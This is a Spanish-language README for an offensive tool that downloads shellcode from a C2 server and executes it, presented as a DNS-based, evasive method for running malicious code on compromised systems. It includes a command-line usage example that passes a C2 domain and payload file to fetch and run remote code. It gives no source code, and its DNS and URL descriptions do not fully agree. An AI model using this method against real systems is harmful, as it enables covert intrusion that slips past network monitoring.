# DNSShellcodeLoader

DNSShellcodeLoader es una herramienta diseñada para cargar shellcode de forma remota a través de consultas DNS. Esta herramienta puede ser útil en escenarios de prueba de penetración, investigación de seguridad y desarrollo de exploits.

## Descripción

La carga remota de shellcode a través de consultas DNS proporciona un método discreto y evasivo para obtener y ejecutar código malicioso en sistemas comprometidos. Esta técnica aprovecha el tráfico DNS saliente, que es común y a menudo pasa desapercibido por los sistemas de seguridad de red.

DNSShellcodeLoader simplifica el proceso de descarga y ejecución de shellcode, permitiendo a los usuarios especificar un nombre de dominio del servidor C2 y el nombre del archivo de shellcode. La herramienta generará una URL ofuscada que se utilizará para la descarga de la shellcode. Además, DNSShellcodeLoader incluye técnicas de seguridad para validar la integridad de la shellcode descargada y manejar errores de descarga de manera robusta.

## Uso

Para usar DNSShellcodeLoader, sigue estos pasos:

1. Ejecuta la herramienta proporcionando el nombre de dominio del servidor C2 y el nombre del archivo de shellcode como argumentos de línea de comandos.
    ```
    DNSShellcodeLoader.exe example.com shellcode.bin
    ```

2. La herramienta generará una URL ofuscada para la descarga de la shellcode y realizará la descarga desde el servidor remoto.

3. Una vez descargada la shellcode, se validará su integridad y se ejecutará en el sistema local.

**Nota:** Asegúrate de tener permiso para realizar pruebas de penetración y ejecutar código malicioso en sistemas antes de utilizar esta herramienta en un entorno de producción.

## Aviso legal

Esta herramienta se proporciona únicamente con fines educativos y de investigación. El uso indebido de DNSShellcodeLoader puede ser ilegal y está estrictamente prohibido. El autor y los colaboradores no se hacen responsables del uso indebido de esta herramienta.


